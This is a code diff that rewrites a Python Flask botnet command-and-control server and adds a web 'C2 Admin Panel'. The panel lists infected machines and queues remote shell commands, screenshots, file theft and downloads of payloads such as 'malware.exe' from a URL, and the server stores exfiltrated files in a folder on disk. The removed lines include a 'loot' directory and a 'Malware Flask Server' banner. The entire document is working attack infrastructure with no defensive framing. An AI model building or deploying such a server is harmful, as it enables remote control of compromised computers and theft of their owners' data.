@@ -1,139 +1,286 @@
-from flask import Flask, jsonify, request
+from flask import Flask, request, jsonify, send_file, render_template_string, Response
+import time
 import os
-import uuid
+import json
 import base64
 from datetime import datetime
+from io import BytesIO
 
 app = Flask(__name__)
 
-# Storage
-bots = {} # bot_id: {info: ..., commands: [], results: []}
-chat_history = []
+# --- GLOBAL STATE (In-Memory) ---
+# Clients: { client_id: { "ip": str, "last_seen": float, "hostname": str } }
+CLIENTS = {}
+# Command Queue: { client_id: [ { "type": str, "args": str, "id": str } ] }
+COMMANDS = {}
+# Results: { client_id: [ { "type": str, "content": str, "timestamp": str } ] }
+RESULTS = {}
+
+UPLOAD_FOLDER = 'server_uploads'
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
+# --- ADMIN UI TEMPLATE ---
+ADMIN_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Admin Panel</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #0f0; margin: 0; padding: 20px; }
+        .container { max_width: 1200px; margin: 0 auto; }
+        .panel { border: 1px solid #333; padding: 10px; margin-bottom: 20px; background: #222; }
+        h2 { border-bottom: 1px solid #444; padding-bottom: 5px; margin-top: 0; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { text-align: left; padding: 8px; border-bottom: 1px solid #333; }
+        th { background: #333; }
+        tr:hover { background: #2a2a2a; }
+        input, select, button { background: #333; color: white; border: 1px solid #555; padding: 5px; }
+        button:hover { background: #444; cursor: pointer; }
+        .status-online { color: #0f0; }
+        .status-offline { color: #f00; }
+        #log-window { height: 300px; overflow-y: scroll; border: 1px solid #444; padding: 10px; background: #000; white-space: pre-wrap; }
+        .img-preview { max_width: 100%; border: 1px solid #555; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>[ C2 COMMAND CENTER ]</h1>
+        
+        <div class="panel">
+            <h2>Connected Bots</h2>
+            <button onclick="refreshBots()">Refresh List</button>
+            <table id="bots-table">
+                <thead><tr><th>ID</th><th>IP</th><th>Hostname</th><th>Last Seen</th><th>Actions</th></tr></thead>
+                <tbody></tbody>
+            </table>
+        </div>
+
+        <div class="panel">
+            <h2>Control Panel</h2>
+            <div>
+                <label>Target Bot ID:</label>
+                <input type="text" id="target-id" placeholder="Select a bot above" readonly>
+            </div>
+            <br>
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="cmd-input" placeholder="Command (e.g., dir, whoami)" style="flex-grow: 1;">
+                <button onclick="sendCommand('shell')">Shell Exec</button>
+                <button onclick="sendCommand('screenshot')">Screenshot</button>
+                <button onclick="sendCommand('download')">Download File</button>
+                <button onclick="uploadFile()">Upload File to Bot</button>
+            </div>
+        </div>
+
+        <div class="panel">
+            <h2>Live Feed / Logs</h2>
+            <div id="log-window"></div>
+        </div>
+    </div>
+
+    <script>
+        let currentBot = null;
+        const API_BASE = "";
+
+        function selectBot(id) {
+            currentBot = id;
+            document.getElementById('target-id').value = id;
+            log(`Selected Bot: ${id}`);
+            fetchResults(id);
+        }
+
+        async function refreshBots() {
+            const res = await fetch(API_BASE + '/api/clients');
+            const data = await res.json();
+            const tbody = document.querySelector('#bots-table tbody');
+            tbody.innerHTML = '';
+            
+            for (const [id, info] of Object.entries(data)) {
+                const now = Date.now() / 1000;
+                const lastSeen = info.last_seen;
+                const isOnline = (now - lastSeen) < 10; // 10s threshold
+                
+                const row = `
+                    <tr onclick="selectBot('${id}')" style="cursor:pointer">
+                        <td>${id}</td>
+                        <td>${info.ip}</td>
+                        <td>${info.hostname}</td>
+                        <td class="${isOnline ? 'status-online' : 'status-offline'}">
+                            ${isOnline ? 'ONLINE' : 'OFFLINE'} (${Math.floor(now - lastSeen)}s ago)
+                        </td>
+                        <td><button onclick="selectBot('${id}')">Select</button></td>
+                    </tr>
+                `;
+                tbody.innerHTML += row;
+            }
+        }
+
+        async function sendCommand(type) {
+            if (!currentBot) { alert("Select a bot first!"); return; }
+            let args = "";
+            
+            if (type === 'shell' || type === 'download') {
+                args = document.getElementById('cmd-input').value;
+                if (!args) { alert("Enter an argument/command!"); return; }
+            }
+
+            const res = await fetch(API_BASE + '/api/command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ id: currentBot, type: type, args: args })
+            });
+            const j = await res.json();
+            log(`Command Sent: ${type} ${args} -> ${j.status}`);
+            
+            // Start polling for results
+            setTimeout(() => fetchResults(currentBot), 2000);
+        }
+
+        async function uploadFile() {
+             if (!currentBot) { alert("Select a bot first!"); return; }
+             const url = prompt("Enter Direct Download URL for the bot to fetch (e.g. http://site.com/malware.exe):");
+             if (url) {
+                 document.getElementById('cmd-input').value = url;
+                 sendCommand('upload_url');
+             }
+        }
+        
+        async function fetchResults(botId) {
+            if (botId !== currentBot) return;
+            const res = await fetch(API_BASE + `/api/results/${botId}`);
+            const data = await res.json();
+            
+            const logWin = document.getElementById('log-window');
+            logWin.innerHTML = ""; // Clear for now, can append if preferred
+            
+            data.forEach(item => {
+                let content = item.content;
+                if (item.type === 'screenshot') {
+                     content = `<img src="data:image/jpeg;base64,${content}" class="img-preview">`;
+                } else if (item.type === 'file_download') {
+                     content = `[FILE DOWNLOADED] Saved to server as: ${item.filename}`;
+                }
+                
+                logWin.innerHTML += `<div><strong>[${item.timestamp}] ${item.type}:</strong><br>${content}</div><hr>`;
+            });
+        }
+
+        function log(msg) {
+            const logWin = document.getElementById('log-window');
+            logWin.innerHTML += `<div>[SYSTEM] ${msg}</div>`;
+            logWin.scrollTop = logWin.scrollHeight;
+        }
+
+        setInterval(refreshBots, 5000);
+        refreshBots();
+    </script>
+</body>
+</html>
+"""
+
+# --- BOT ENDPOINTS ---
+
+@app.route('/')
+def index():
+    return "Service Running"
 
 @app.route('/register', methods=['POST'])
 def register():
+    """Bot check-in/registration"""
     data = request.json
-    bot_id = data.get('id', str(uuid.uuid4())[:8])
-    ip = request.remote_addr
+    client_id = data.get('id')
+    hostname = data.get('hostname')
     
-    bots[bot_id] = {
-        "ip": ip,
-        "hostname": data.get('hostname', 'Unknown'),
-        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "commands": [],
-        "results": []
+    CLIENTS[client_id] = {
+        "ip": request.remote_addr,
+        "hostname": hostname,
+        "last_seen": time.time()
     }
     
-    alert = f"ALERT: Bot '{bot_id}' joined from {ip}"
-    chat_history.append({"user": "SYSTEM", "message": alert, "role": "system"})
-    print(alert)
-    
-    return jsonify({"status": "registered", "bot_id": bot_id})
+    if client_id not in COMMANDS:
+        COMMANDS[client_id] = []
+        
+    print(f"[+] Bot Check-in: {client_id} ({request.remote_addr})")
+    return jsonify({"status": "ok"})
 
-@app.route('/poll/<bot_id>', methods=['GET'])
-def poll(bot_id):
-    if bot_id not in bots:
-        return jsonify({"status": "error", "message": "Bot not registered"}), 404
+@app.route('/poll/<client_id>', methods=['GET'])
+def poll(client_id):
+    """Bot long-polling for commands"""
+    if client_id in CLIENTS:
+        CLIENTS[client_id]['last_seen'] = time.time()
     
-    bots[bot_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    if bots[bot_id]["commands"]:
-        cmd = bots[bot_id]["commands"].pop(0)
+    # Check for pending commands
+    if client_id in COMMANDS and len(COMMANDS[client_id]) > 0:
+        cmd = COMMANDS[client_id].pop(0)
         return jsonify(cmd)
     
     return jsonify({"status": "idle"})
 
-@app.route('/report/<bot_id>', methods=['POST'])
-def report(bot_id):
-    if bot_id not in bots:
-        return jsonify({"status": "error", "message": "Bot not registered"}), 404
-    
+@app.route('/report/<client_id>', methods=['POST'])
+def report(client_id):
+    """Bot reporting results"""
     data = request.json
-    result_type = data.get('type')
-    content = data.get('content')
+    if client_id not in RESULTS:
+        RESULTS[client_id] = []
+        
+    result_entry = {
+        "type": data.get('type'),
+        "content": data.get('content'),
+        "filename": data.get('filename'),
+        "timestamp": datetime.now().strftime("%H:%M:%S")
+    }
     
-    if result_type == 'screenshot':
-        # Decode base64 image and save
+    # If it's a file download, save it to disk
+    if data.get('type') == 'file_download' and data.get('content'):
         try:
-            img_data = base64.b64decode(content)
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"screenshot_{bot_id}_{timestamp}.jpg"
-            with open(filename, 'wb') as f:
-                f.write(img_data)
-            msg = f"Screenshot saved as {filename}"
-        except Exception as e:
-            msg = f"Error saving screenshot: {e}"
-        chat_history.append({"user": bot_id, "message": msg, "role": "bot_res"})
-        
-    elif result_type == 'shell':
-        chat_history.append({"user": bot_id, "message": f"Shell result:\n{content}", "role": "bot_res"})
-        
-    elif result_type == 'file_download':
-        # Handle file data
-        try:
-            file_data = base64.b64decode(content)
-            filename = f"downloaded_{bot_id}_{data.get('filename', 'file')}"
-            with open(filename, 'wb') as f:
+            file_data = base64.b64decode(data.get('content'))
+            fname = f"{client_id}_{data.get('filename')}"
+            path = os.path.join(UPLOAD_FOLDER, fname)
+            with open(path, 'wb') as f:
                 f.write(file_data)
-            msg = f"File saved as {filename}"
+            result_entry['content'] = f"Saved to {fname}" 
+            print(f"[+] File received from {client_id}: {fname}")
         except Exception as e:
-            msg = f"Error saving file: {e}"
-        chat_history.append({"user": bot_id, "message": msg, "role": "bot_res"})
-    
-    else:
-        chat_history.append({"user": bot_id, "message": content, "role": "bot_res"})
-        
-    return jsonify({"status": "success"})
+            result_entry['content'] = f"Error saving file: {e}"
 
-@app.route('/chat', methods=['GET', 'POST'])
-def chat():
-    if request.method == 'POST':
-        data = request.json
-        user = data.get('user', 'ADMIN')
-        message = data.get('message', '')
-        role = data.get('role', 'admin')
-        
-        chat_history.append({"user": user, "message": message, "role": role})
-        
-        # Check if message is a command for a bot
-        # Format: /cmd <bot_id> <command> <args...>
-        if message.startswith('/cmd '):
-            parts = message.split(' ', 3)
-            if len(parts) >= 3:
-                target_bot = parts[1]
-                cmd_type = parts[2]
-                args = parts[3] if len(parts) > 3 else ""
-                
-                if target_bot in bots:
-                    bots[target_bot]["commands"].append({
-                        "id": str(uuid.uuid4())[:8],
-                        "type": cmd_type,
-                        "args": args
-                    })
-                    chat_history.append({"user": "SYSTEM", "message": f"Queued {cmd_type} for bot {target_bot}", "role": "system"})
-                elif target_bot == 'all':
-                    for b_id in bots:
-                        bots[b_id]["commands"].append({
-                            "id": str(uuid.uuid4())[:8],
-                            "type": cmd_type,
-                            "args": args
-                        })
-                    chat_history.append({"user": "SYSTEM", "message": f"Queued {cmd_type} for ALL bots", "role": "system"})
-                else:
-                    chat_history.append({"user": "SYSTEM", "message": f"Bot {target_bot} not found", "role": "system"})
-        
-        return jsonify({"status": "success"})
+    RESULTS[client_id].insert(0, result_entry) # Prepend newest
+    RESULTS[client_id] = RESULTS[client_id][:20] # Keep last 20
     
-    return jsonify(chat_history)
+    print(f"[*] Result received from {client_id}: {data.get('type')}")
+    return jsonify({"status": "received"})
 
-@app.route('/admin/bots', methods=['GET'])
-def get_bots():
-    return jsonify(bots)
+# --- ADMIN ENDPOINTS ---
+
+@app.route('/admin')
+def admin_ui():
+    return render_template_string(ADMIN_HTML)
+
+@app.route('/api/clients')
+def api_clients():
+    return jsonify(CLIENTS)
+
+@app.route('/api/command', methods=['POST'])
+def api_command():
+    data = request.json
+    client_id = data.get('id')
+    cmd_type = data.get('type')
+    args = data.get('args', '')
+    
+    if client_id not in COMMANDS:
+        COMMANDS[client_id] = []
+        
+    COMMANDS[client_id].append({
+        "type": cmd_type,
+        "args": args,
+        "id": str(time.time())
+    })
+    
+    return jsonify({"status": "queued"})
+
+@app.route('/api/results/<client_id>')
+def api_results(client_id):
+    return jsonify(RESULTS.get(client_id, []))
 
 if __name__ == '__main__':
-    print("Malware Flask Server starting on port 5000...")
-    # Create a directory for downloads/screenshots if not exists
-    if not os.path.exists('loot'):
-        os.makedirs('loot')
-    os.chdir('loot')
-    app.run(host='0.0.0.0', port=10000)
+    # Run on all interfaces
+    app.run(host='0.0.0.0', port=5000)
